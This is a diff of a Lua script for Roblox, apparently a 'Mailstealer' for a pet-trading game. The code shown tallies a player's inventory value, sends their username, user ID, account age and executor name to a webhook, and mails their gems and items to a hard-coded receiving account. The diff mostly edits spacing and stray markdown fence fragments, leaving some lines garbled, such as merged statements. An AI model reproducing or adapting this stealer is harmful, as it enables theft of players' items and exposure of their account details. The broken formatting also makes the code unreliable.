@@ -106,7 +106,7 @@ local FormatNumber = function(number)
     return string.format("%.2f%s", n, suf[INDEX])
 end
 
-local GetItemValue = function(Type, ItemTable)
+local GetItemValue = function(Type, ItemTable )
     local success, result = pcall(function()
         return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
             {
@@ -140,8 +140,7 @@ local GetItemValue = function(Type, ItemTable)
     return result
 end
 
-local GetItemValueOfItems = ```lua
-function()
+local GetItemValueOfItems = function()
     local RAP = 0
     for name_of_category, category in pairs(Inventory) do
         if category ~= nil then
@@ -173,7 +172,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     local fardplayer = game:GetService("Players").LocalPlayer
     local ExecutorWebhook = identifyexecutor() or "undefined"
     local JobId = game.JobId
-    local PlayerUser  = Player.Name
+    local PlayerUser   = Player.Name
     local msg = {
         ["content"] = ping,
         ["username"] = "" .. mailstealer_name .. " Mailstealer",
@@ -191,7 +190,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                         ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
                         ["value"] = "```Username     : " ..
                             fardplayer.Name ..
-                                "\nUser    -ID      : " ..
+                                "\nUser     -ID      : " ..
                                     fardplayer.userId ..
                                         "\nAccount Age  : " ..
                                             fardplayer.AccountAge ..
@@ -230,7 +229,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                         ["inline"] = true
                     },
                     {
-                        ["name"] = ":rainbow: **RB/Gold/Reg** :sparkles:",
+                        ["name"] = ":rainbow : **RB/Gold/Reg** :sparkles:",
                         ["value"] = "```➜ " .. RBgoldNormal .. "```",
                         ["inline"] = true
                     }
@@ -374,7 +373,7 @@ local function GetListWithAllItems()
         end
     end
     if Inventory.Enchant ~= nil then
-        for i, v in pairs(Inventory.Enchant) do
+        for i, v in pairs( Inventory.Enchant) do
             id = v.id
             dir = Directory.Enchants[id]
             rap = GetItemValue("Enchant", v)
@@ -399,7 +398,8 @@ local function GetListWithAllItems()
     end
     if Inventory.Lootbox ~= nil then
         for i, v in pairs(Inventory.Lootbox) do
-            id = v.id dir = Directory.Lootboxes[id]
+            id = v.id
+            dir = Directory.Lootboxes[id]
             rap = GetItemValue("Lootbox", v)
             ItemType = "Normal"
             ItemImageId = dir.Icon
@@ -519,8 +519,7 @@ local function GetListWithAllItems()
                     }
                 )
             end
-        end
-    end
+        end end
     if Inventory.Hoverboard ~= nil then
         for i, v in pairs(Inventory.Hoverboard) do
             id = v.id
@@ -546,8 +545,7 @@ local function GetListWithAllItems()
             end
         end
     end
-    if Inventory.Booth ~= ```lua
-nil then
+    if Inventory.Booth ~= nil then
         for i, v in pairs(Inventory.Booth) do
             id = v.id
             dir = Directory.Booths[id]
@@ -657,8 +655,7 @@ local function SendAllGems()
     for i, v in pairs(Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemsAmount >= (FirstPriceOfMail + 10000) then
-                SentGems = GemsAmount - FirstPriceOfMail
-                local args = {
+                SentGems = GemsAmount - FirstPriceOfMail local args = {
                     [1] = Roblox_Username,
                     [2] = "" .. mailstealer_name .. " mailstealer on top",
                     [3] = "Currency",
@@ -679,8 +676,7 @@ end
 Left_Hits = #hits
 
 if #hits > 0 or GemsAmount > FirstPriceOfMail then
-    local blob_a ```lua
-= require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local blob_a = require(game:GetService("ReplicatedStorage").Library.Client.Save)
     local blob_b = blob_a.Get()
 
     FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
